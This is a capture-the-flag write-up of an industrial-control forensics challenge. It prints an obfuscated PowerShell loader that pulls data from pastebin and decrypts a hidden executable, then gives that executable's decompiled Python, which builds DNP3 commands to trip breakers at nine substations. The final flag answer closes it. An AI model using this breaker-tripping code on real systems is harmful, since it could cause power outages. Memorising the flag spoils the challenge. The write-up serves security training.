## tripping breakers (ics, 481)

```text
Attached is a forensics capture of an HMI (human machine interface) containing scheduled tasks, registry hives, and user profile of an operator account. There is a scheduled task that executed in April 2021 that tripped various breakers by sending DNP3 messages. We would like your help clarifying some information. What was the IP address of the substation_c, and how many total breakers were tripped by this scheduled task? Flag format: flag{IP-Address:# of breakers}. For example if substation_c's IP address was 192.168.1.2 and there were 45 total breakers tripped, the flag would be flag{192.168.1.2:45}.
```

Looking around the filesystem finds us this lovely powershell script in Temp. 

```powershell
$SCOP = ((new-object System.Net.WebClient).DownloadString("https://pastebin.com/raw/rBXHdE85")).Replace("!","f").Replace("@","q").Replace("#","z").Replace("<","B").Replace("%","K").Replace("^","O").Replace("&","T").Replace("*","Y").Replace("[","4").Replace("]","9").Replace("{","=");$SLPH = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($SCOP)); $E=(Get-ItemProperty -Path $SLPH -Name Blast)."Blast";$TWR =  "!M[[pcU09%d^kV&l#9*0XFd]cVG93<".Replace("!","SEt").Replace("@","q").Replace("#","jcm").Replace("<","ZXI=").Replace("%","GVF").Replace("^","BU").Replace("&","cTW").Replace("*","zb2Z").Replace("[","T").Replace("]","iZW1").Replace("{","Fdi");$BRN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TWR)); $D= (Get-ItemProperty -Path $BRN -Name Off)."Off";openssl aes-256-cbc -a -A -d -salt -md sha256 -in $env:temp$D -pass pass:$E -out "c:\1\fate.exe";
```

```text
❯ cat Registry/SOFTWARE_ROOT.json | jq | grep -i "tabletpc..bell" -A 10 -B 3
              "LastWriteTimestamp": "/Date(1617231964815)/",
              "SubKeys": [
                {
                  "KeyPath": "ROOT\\Microsoft\\Windows\\TabletPC\\Bell",
                  "KeyName": "Bell",
                  "LastWriteTimestamp": "/Date(1617231990846)/",
                  "SubKeys": [],
                  "Values": [
                    {
                      "ValueName": "Blast",
                      "ValueType": "RegSz",
                      "ValueData": "M4RK_MY_W0Rd5",
                      "DataRaw": "TQA0AFIASwBfAE0AWQBfAFcAMABSAGQANQAAAA==",
                      "Slack": ""
❯ cat Registry/SOFTWARE_ROOT.json | jq | grep -i "wbem..tower" -A 10 -B 3
              "Values": []
            },
            {
              "KeyPath": "ROOT\\Microsoft\\Wbem\\Tower",
              "KeyName": "Tower",
              "LastWriteTimestamp": "/Date(1617231936549)/",
              "SubKeys": [],
              "Values": [
                {
                  "ValueName": "Off",
                  "ValueType": "RegSz",
                  "ValueData": "\\EOTW\\151.txt",
                  "DataRaw": "XABFAE8AVABXAFwAMQA1ADEALgB0AHgAdAAAAA==",
                  "Slack": ""
```

So, turns out Powershell actually exists on Linux -- I used it to evaluate these subcommands. The more you know!  It decrypts EOTW\151.txt with "M4RK_MY_W0Rd5" as the password and then runs the result, so I run it to decrypt fate.exe. I opened it up in Binary Ninja, cried a little bit, and then realized it was a package python script with PyInstaller. I hit it with [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) and uncompyle6 to get this lightly modified python file. 

```python
# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.0 (default, Mar  3 2017, 23:25:37) 
# [GCC 5.3.0]
# Embedded file name: trip_breakers.py
import struct, socket, time, sys
from crccheck.crc import Crc16Dnp
OPT_1 = 3
OPT_2 = 4
OPT_3 = 66
OPT_4 = 129
class Substation:
    def __init__(self, ip_address, devices):
        self.target = ip_address
        self.devices = []
        self.src = 50
        self.transport_seq = 0
        self.app_seq = 10
        for device in devices:
            self.add_device(device)
        self.connect()
    def connect(self):
        print('Connecting to {}...'.format(self.target))
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect(("127.0.0.1", 20000))
        print('Connected to {}'.format(self.target))
    def add_device(self, device):
        self.devices.append({'dst':device[0],  'count':device[1]})
    def activate_all_breakers(self, code):
        for device in self.devices:
            dnp3_header = self.get_dnp3_header(device['dst'])
            for x in range(1, device['count'] * 2, 2):
                global count
                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_1, code)
                self.socket.send(dnp3_packet)
                # time.sleep(2)
                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_2, code)
                self.socket.send(dnp3_packet)
                # time.sleep(5)
    def get_dnp3_header(self, dst):
        data = struct.pack('<H2B2H', 25605, 24, 196, dst, self.src)
        data += struct.pack('<H', Crc16Dnp.calc(data))
        return data
    def get_dnp3_data(self, index, function, code):
        data = struct.pack('<10BIH', 192 + self.transport_seq, 192 + self.app_seq, function, 12, 1, 23, 1, index, code, 1, 500, 0)
        data += struct.pack('<H', Crc16Dnp.calc(data))
        data += struct.pack('<HBH', 0, 0, 65535)
        self.transport_seq += 1
        self.app_seq += 1
        if self.transport_seq >= 62:
            self.transport_seq = 0
        if self.app_seq >= 62:
            self.app_seq = 0
        return data
def main():
    # if socket.gethostname() != 'hmi':
    #     sys.exit(1)
    substation_a = Substation('10.95.101.80', [(2, 4), (19, 8)])
    substation_b = Substation('10.95.101.81', [(9, 5), (8, 7), (20, 12), (15, 19)])
    substation_c = Substation('10.95.101.82', [(14, 14), (9, 16), (15, 4), (12, 5)])
    substation_d = Substation('10.95.101.83', [(20, 17), (16, 8), (8, 14)])
    substation_e = Substation('10.95.101.84', [(12, 4), (13, 5), (4, 2), (11, 9)])
    substation_f = Substation('10.95.101.85', [(1, 4), (3, 9)])
    substation_g = Substation('10.95.101.86', [(10, 14), (20, 7), (27, 4)])
    substation_h = Substation('10.95.101.87', [(4, 1), (10, 9), (13, 6), (5, 21)])
    substation_i = Substation('10.95.101.88', [(14, 13), (19, 2), (8, 6), (17, 8)])
    substation_a.activate_all_breakers(OPT_3)
    substation_b.activate_all_breakers(OPT_4)
    substation_c.activate_all_breakers(OPT_4)
    substation_d.activate_all_breakers(OPT_4)
    substation_e.activate_all_breakers(OPT_3)
    substation_f.activate_all_breakers(OPT_4)
    substation_g.activate_all_breakers(OPT_3)
    substation_h.activate_all_breakers(OPT_4)
    substation_i.activate_all_breakers(OPT_4)
if __name__ == '__main__':
    main()
# okay decompiling fate.exe_extracted/trip_breakers.pyc
```

I modified it to connect to localhost so I could packet capture it and then opened it up in wireshark. I applied some filters to only measure tripped breakers (re: OPT_4) and counted the number remaining to get the flag. 

flag{10.95.101.82:200}